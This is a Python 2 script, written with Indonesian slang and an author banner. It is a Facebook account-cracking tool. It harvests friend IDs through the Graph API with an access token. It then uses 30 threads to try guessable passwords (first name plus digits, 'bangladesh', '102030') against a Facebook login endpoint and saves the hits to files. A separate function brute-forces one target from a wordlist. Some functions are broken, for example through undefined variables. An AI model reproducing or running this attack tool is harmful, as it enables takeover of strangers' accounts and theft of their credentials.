#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)


##### LOGO #####
logo = """
\33[31;1mOFFICIAL B•O•Y
\033[1;91m▇▇▇▇▇▇▇═══▇▇▇▇▇══▇─────▇
\033[1;92m▇─────▇▇═▇─────▇═▇─────▇
\033[1;93m███████══▇──░──▇═███████
\033[1;94m▇─────▇▇═▇─────▇═──────▇
\033[1;95m███████═══█████══███████
\033[1;97m╚═════╝───╚═══╝──╚═════╝
\033[1;91m▇─────▇══─████═─▇▇───▇▇═─▇▇▇▇▇▇═─████═─▇─────▇
\033[1;92m▇─────▇═─█─══─█═▇▇▇─▇▇▇═─────█═─▇─══─▇═▇─────▇
\033[1;93m███████═─██████═▇▇▇▇▇▇▇═────█══─██████═▇▇▇▇▇▇▇
\033[1;94m▇─────▇═─█────█═▇──▇──▇═───█═══─▇────▇═▇─────▇
\033[1;95m▇─────▇═─█────█═▇─────▇═─██████─▇────▇═▇─────▇
\033[1;97m╚═════╝═╚═╝══╚═╝╚═════╝══╚════╝╚══════╝╚═════╝\33[31;1mEX.
\33[31;1mDi Sponsori Oleh. XNXX.COM
\33[33;1m═════════════════════════
\33[31;1mFACEBOOK =  HAMZAH KIRANA
\33[31;1mWHATSAPP =  083124856095
\33[33;1m═════════════════════════"""

jalan("\033[1;96m▬▬▬▬▬ JANGAN DI RECOD ya ANJENG😠 ▬▬▬▬▬  ")
jalan("\033[1;96m▬▬▬▬▬ GUA AJA RECOD punya TEMAN BABI😑 ▬▬▬▬▬")
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[●] \x1b[1;96mSedang masuk \x1b[1;96m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\33[31;1mOFFICIAL B•O•Y
\033[1;91m▇▇▇▇▇▇▇═══▇▇▇▇▇══▇─────▇
\033[1;92m▇─────▇▇═▇─────▇═▇─────▇
\033[1;93m███████══▇──░──▇═███████
\033[1;94m▇─────▇▇═▇─────▇═──────▇
\033[1;95m███████═══█████══███████
\033[1;97m╚═════╝───╚═══╝──╚═════╝
\033[1;91m▇─────▇══─████═─▇▇───▇▇═─▇▇▇▇▇▇═─████═─▇─────▇
\033[1;92m▇─────▇═─█─══─█═▇▇▇─▇▇▇═─────█═─▇─══─▇═▇─────▇
\033[1;93m███████═─██████═▇▇▇▇▇▇▇═────█══─██████═▇▇▇▇▇▇▇
\033[1;94m▇─────▇═─█────█═▇──▇──▇═───█═══─▇────▇═▇─────▇
\033[1;95m▇─────▇═─█────█═▇─────▇═─██████─▇────▇═▇─────▇
\033[1;97m╚═════╝═╚═╝══╚═╝╚═════╝══╚════╝╚══════╝╚═════╝\33[31;1mEX.
\33[31;1mDi Sponsori Oleh. XNXX.COM
\33[33;1m═════════════════════════
\33[31;1mFACEBOOK =  HAMZAH KIRANA
\33[31;1mWHATSAPP =  083124856095
\33[33;1m═════════════════════════"""
jalan('\033[1;96m▬10%')
jalan("\033[1;96m▬▬20%")
jalan('\033[1;96m▬▬▬30%')
jalan('\033[1;96m▬▬▬▬40%')
jalan("\033[1;96m▬▬▬▬▬50%")
jalan("\033[1;96m▬▬▬▬▬▬60%    \033[1;91mSabar NJENG masi Menginstal")
jalan('\033[1;96m▬▬▬▬▬▬▬70%')
jalan('\033[1;96m▬▬▬▬▬▬▬▬80%')
jalan('\033[1;96m▬▬▬▬▬▬▬▬▬90%')
jalan('\033[1;96m▬▬▬▬▬▬▬▬▬100% PENGINSTALAN SUDAH SIAP MBOT')
print "\033[1;91mHAYOOO USERNAME dan SANDI nya Apa...???"

CorrectUsername = "boy"
CorrectPassword = "hamzah"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[🦇] \x1b[1;96mMasukan Username Nya kontol \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[🦇] \x1b[1;96mMasukan Sandi Nya Pek \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Lu Berhasil Masuk Njeng " + username
            loop = 'false'
        else:
            print "Sandi Salah, Silahkan Chat Admin Nya Di WA. Dan Lu Otomotis Di Arahkan Ke WA Admin Nya"
            os.system('xdg-open https://api.whatsapp.com/send?phone=+6283124856095')
    else:
        print "Username Salah, Silahkan Chat Admin Nya Di WA. Dan Lu Otomotis Di Arahkan Ke WA Admin Nya"
        os.system('xdg-open https://api.whatsapp.com/send?phone=+6283124856095')

	def login():
	os.system('clear')
	print logo11
	print "\x1b[1;94m1.\x1b[1;94mMasuk Facebook Baru"
        time.sleep(0.05)
        print "2.\x1b[1;94mMendapat kan TOKEN "
        time.sleep(0.05)
        print "3.\x1b[1;94mMasuk Via TOKEN"
        time.sleep(0.05)
	print "0.\033[1;95mMINGGAT           "
	pilih_login()
	
def pilih_login():
	peak = raw_input("Pilih Nomor Nya👉👉👉 \33[31;1m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        os.system('xdg-open https://www.igniel.com/2018/05/token-facebook-for-android-ios-client-side.html?m=1')
	        login()
	elif peak =="3":
	        tokenz()
	elif peak =="0":
		keluar()
        else:
		print"\033[1;91m[!] Wrong input"
		keluar()
		
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;91mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;96m[!] \x1b[1;91mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print 42*"\033[1;96m="
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;96m Nama \033[1;96m: \033[1;96m"+nama+"\033[1;97m               "
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;96m ID   \033[1;96m: \033[1;96m"+id+"\x1b[1;97m              "
	print 42*"\033[1;96m="
	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;96m Mulai Eksekusi"
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Minggat            "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
	if unikers =="":
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;96m Crack Dari Daftar Teman"
	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;96m Crack Bangldesh"
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Kembali"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
	if peak =="":
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		jalan('\033[1;96m[✺] \033[1;96mMengumpulkan ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		idt = raw_input("\033[1;96m[+] \033[1;96mMasukan ID \033[1;96m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;40m[✺] Nama : "+op["name"]
		except KeyError:
			print"\x1b[1;92m[✺] ID Tidak ada!"
			raw_input("\n\033[1;96m[\033[1;94mKembali\033[1;96m]")
			super()
		print"\033[1;35;40m[✺] Total Semua ID.."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		brute()	
	elif peak =="4":
		os.system('clear')
		print logo                  
		try:
			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan Nama File \x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;35;40m[!] \x1b[1;35;40mFile not found'
			raw_input('\n\x1b[1;35;40m[ \x1b[1;35;40mExit \x1b[1;35;40m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFile Tidak Ada"
		pilih_super()

	
	print "\033[1;36;43m[✺] Total ID : \033[1;94m"+str(len(id))
	jalan('\033[1;34;40m[✺] Tunggu Ya Kentot...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;32;40m[✺] Mulai Maling\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m        ❈     \x1b[1;31Jika Mau Berhenti Tekan Ctrl + Z \033[1;94m    ❈"
	print " \033[1;31;40m●💀════════════════════════◄🦇►════════════════════════💀●"

	jalan('             \033[1;31Boy Lagi Mencari Mangsa, Sabar NJENG...')
	print  "\033[1;36;40m ●💀════════════════════════◄🦇►════════════════════════💀●" 

	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'] + '123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass1 + ' 🦇 ' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass1 + ' 🦇 ' + b['name']
					cek = open("out/CP.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'] + '1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass2 + ' 🦇 ' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass2 + ' 🦇 ' + b['name']
							cek = open("out/CP.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass3 + ' 🦇 ' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass3 + ' 🦇 ' + b['name']
									cek = open("out/CP.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass4)
								else:
									pass4 = 'banglaboy'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass4 + ' 🦇 ' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass4 + ' 🦇 ' + b['name']
											cek = open("out/CP.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = 'bangladesh'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass5 + ' 🦇 ' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass5 + ' 🦇 ' + b['name']
													cek = open("out/CP.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = '102030'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass6 + ' 🦇 ' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass6 + ' 🦇 ' + b['name']
															cek = open("out/CP.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = '112233'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass7 + ' 🦇 ' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass7 + ' 🦇 ' + b['name']
																	cek = open("out/CP.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
		except:																		
			pass
		
	p = ThreadPool(30)
	p.map(main, id) 
	
	print '\033[1;31;40m[✓] Maling Nya Sudah Siap\033[1;96m....'
	print "\033[1;32;40m[+] Total OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;31;40m/\033[1;36;40m"+str(len(cekpoint))
	print '\033[1;34;40m[+] Yang Cp Tersimpan Di : save/cp.txt'
	print """
\033[1;31;40m ●════════════════════════◄►════════════════════════●
           """
	raw_input("\n\033[1;96m[\033[1;97mMinggat\033[1;96m]")
	super()

def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.5)
        login()
    else:
        os.system('clear')
        print logo
        print '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
        try:
            email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
            passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget Yang Mau Di Eksekusi \x1b[1;91m:\x1b[1;97m ' + email
            print '\x1b[1;91m[+] \x1b[1;92mTotal\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu Yeee Kentot \x1b[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mTry \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                        print 52 * '\x1b[1;97m\xe2\x95\x90'
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                        keluar()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                            print  "\033[1;36;40m ●════════════════════════◄►════════════════════════●"
                            print '\x1b[1;91m[!] \x1b[1;93mFB Nya Check Point'
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID \x1b[1;91m:\x1b[1;97m ' + email
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mSandi \x1b[1;91m:\x1b[1;97m ' + pw
                            keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[!] Connection Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;91m[!] File not found...'
            print """\n\x1b[1;91m[!] \x1b[1;92mLooks like you don't have a wordlist"""
            super()

if __name__ == '__main__':
	login()